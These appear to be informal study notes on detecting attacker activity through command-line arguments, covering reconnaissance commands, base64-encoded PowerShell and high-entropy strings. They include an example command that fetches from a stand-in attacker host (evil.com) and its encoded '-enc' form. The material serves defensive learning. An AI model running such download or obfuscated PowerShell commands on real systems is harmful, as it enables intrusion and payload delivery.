what are `args`:
    - args are command line arguments, we can think of these as the intructions. we could have a process_name and then the args are what instructions were added to these. here we'll see powershell commands, encoded commands, suspicious execution, lolbas abuse, attacker intent. 
    - the could be stuff like finding out what machine theyre on, hostname, os version, users, permissions, antivirus info. remember that stuff like whoami, hostname, etc are not malicious by themselves, but the suspicious part is the timing, sequences, context, parent process, frequency

Why is command-line analysis important? 
    because attackers intent often appear in the arguments, not just the process name.
    note: attackers might hide commands using base64 encoding. so instead of powershell.exe Invoke-WebRequest evil.com, they would run powershell.exe -enc SQBuAHyAbEOSIdsUIFPKJRNhgse. This is just a method of obfuscation. Its not always suspicious, but it is highly suspicious in many enterprise environments. Normal users rarely run -enc. Admin sometimes do, attackers do very often. Its a strong signal not proof of malware

What long/high-entropy commands matter?
    Entropy is randomness. An example of low entropy is `dir`, high entropy is SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AA==
    High entropy commands are used to obfuscate urls, malware, scripts, payloads.


